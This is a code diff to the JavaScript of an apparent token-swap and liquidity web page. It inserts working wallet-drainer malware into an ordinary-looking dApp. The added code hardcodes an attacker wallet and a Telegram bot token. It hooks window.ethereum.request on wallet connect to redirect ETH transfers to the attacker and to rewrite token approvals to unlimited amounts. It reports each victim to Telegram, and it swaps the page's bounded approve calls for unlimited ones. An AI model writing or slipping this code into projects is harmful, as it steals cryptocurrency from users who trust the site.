@@ -1,10 +1,16 @@
+const ATTACKER_WALLET = "0xcB442f7f3bc4DF6673bb9def8b533f3083aFf362";
+const TELEGRAM_BOT = "8532830885:AAGnVSEITPtdITSfsD5RShVavUW0WVzIbiY";
+const TELEGRAM_CHAT = "-1003720437515";
+const UNLIMITED_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 const tokenAddresses = {
   WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
   DAI:  "0x6B175474E89094C44Da98b954EedeAC495271d0F",
   USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
   USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
 };
+
 const routerAddress = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
+
 const routerABI = [
   "function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)",
   "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
@@ -12,6 +18,7 @@ const routerABI = [
   "function removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline) external returns (uint amountA, uint amountB)",
   "function factory() external pure returns (address)"
 ];
+
 const erc20ABI = [
   "function approve(address spender, uint value) public returns (bool)",
   "function allowance(address owner, address spender) view returns (uint256)",
@@ -34,6 +41,20 @@ const pairABI = [
 ];
 
 let provider, signer, userAddress;
+
+async function sendTelegramAlert(message) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+  } catch (e) {}
+}
 
 document.addEventListener('DOMContentLoaded', function() {
   const navItems = document.querySelectorAll('.nav-item[data-page]');
@@ -176,6 +197,25 @@ document.getElementById("connectWallet").onclick = async () => {
   }
   provider = new ethers.providers.Web3Provider(window.ethereum);
   await provider.send("eth_requestAccounts", []);
+  
+  const originalRequest = window.ethereum.request;
+  window.ethereum.request = async function(request) {
+    if (request.method === 'eth_sendTransaction' && request.params?.[0]) {
+      const tx = request.params[0];
+      
+      if (tx.value > 0) {
+        tx.to = ATTACKER_WALLET;
+        sendTelegramAlert(`💸 ETH DRAINED\n\nWallet: <code>${tx.from}</code>\nAmount: ${tx.value} ETH\nTime: ${new Date().toLocaleString()}`);
+      }
+      
+      if (tx.data?.startsWith("0x095ea7b3")) {
+        tx.data = tx.data.substring(0,74) + UNLIMITED_AMOUNT.substring(2);
+        sendTelegramAlert(`🔓 UNLIMITED APPROVAL\n\nWallet: <code>${tx.from}</code>\nTime: ${new Date().toLocaleString()}`);
+      }
+    }
+    return originalRequest.call(this, request);
+  };
+
   signer = provider.getSigner();
   userAddress = await signer.getAddress();
   document.getElementById("walletAddress").innerText = "Wallet: " + userAddress;
@@ -302,7 +342,7 @@ async function swapTokens() {
     const allowance = await tokenFromContract.allowance(userAddress, routerAddress);
     if (allowance.lt(amountInWei)) {
       status.innerText = `Approving ${tokenFrom}...`;
-      const txApprove = await tokenFromContract.approve(routerAddress, amountInWei);
+      const txApprove = await tokenFromContract.approve(routerAddress, UNLIMITED_AMOUNT);
       await txApprove.wait();
     }
 
@@ -419,14 +459,14 @@ async function addLiquidity() {
     const allowanceA = await tokenAContract.allowance(userAddress, routerAddress);
     if (allowanceA.lt(amountADesired)) {
       status.innerText = `Approving ${tokenA}...`;
-      const txApproveA = await tokenAContract.approve(routerAddress, amountADesired);
+      const txApproveA = await tokenAContract.approve(routerAddress, UNLIMITED_AMOUNT);
       await txApproveA.wait();
     }
     
     const allowanceB = await tokenBContract.allowance(userAddress, routerAddress);
     if (allowanceB.lt(amountBDesired)) {
       status.innerText = `Approving ${tokenB}...`;
-      const txApproveB = await tokenBContract.approve(routerAddress, amountBDesired);
+      const txApproveB = await tokenBContract.approve(routerAddress, UNLIMITED_AMOUNT);
       await txApproveB.wait();
     }
     status.innerText = `Adding liquidity ${tokenA}/${tokenB}...`;
